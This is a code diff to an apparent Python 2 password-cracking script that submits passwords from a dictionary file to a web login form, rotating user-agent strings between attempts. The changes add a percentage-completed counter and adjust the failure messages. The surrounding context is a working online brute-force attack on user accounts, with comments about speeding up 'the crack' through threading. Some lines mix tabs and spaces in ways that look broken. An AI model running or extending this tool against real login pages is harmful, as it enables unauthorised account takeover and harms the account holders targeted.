@@ -152,6 +152,12 @@ def setup():
 			
 			
 
+def printPercentage (line):
+	# print the percentage done
+	num_lines = sum(1 for line in open(dic_path))
+	percentcalc = (line / float(num_lines)) * 100
+ 	percentdone = round(percentcalc, 4)
+	print "\n" + str(percentdone) + "%" + " Completed"
 
 #
 # Use threading and queuing to speed up the crack
@@ -172,6 +178,8 @@ def login():
 	# read in the username from the config file.
 	browser.form['email'] = configParser.get('Config', 'user')
 	
+	currLine = 0
+	printPercentage(currLine)
 	for line in fileinput.input(dic_path):
 
 		# This is the current password in the dictionary 
@@ -182,6 +190,7 @@ def login():
 
 		# Print out the tries
 	      	color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')
+		
 
 		# Submit the form.
  		request = browser.submit()
@@ -203,12 +212,16 @@ def login():
 			browser.addheaders = [('User-agent', random_user_agent)]
 
 			# PASSWORD NOT FOUND, DAMN!!
-			action = soup.find('form', id='login_form').get('action')
-			color_print(action, color='red')
-			print("[!] Wrong password")
+			#action = soup.find('form', id='login_form').get('action')
+			#color_print(action, color='red')
+			color_print("[!] Wrong password", color='red')
 			browser.select_form(nr = 0)
+			currLine = currLine+1
+			printPercentage(currLine)
 			continue	
 		else:
+			currLine = sum(1 for line in open(dic_path))
+			printPercentage(currLine)
 
 			#
 			# SUCCESS PASSWORD FOUND, YEY!!
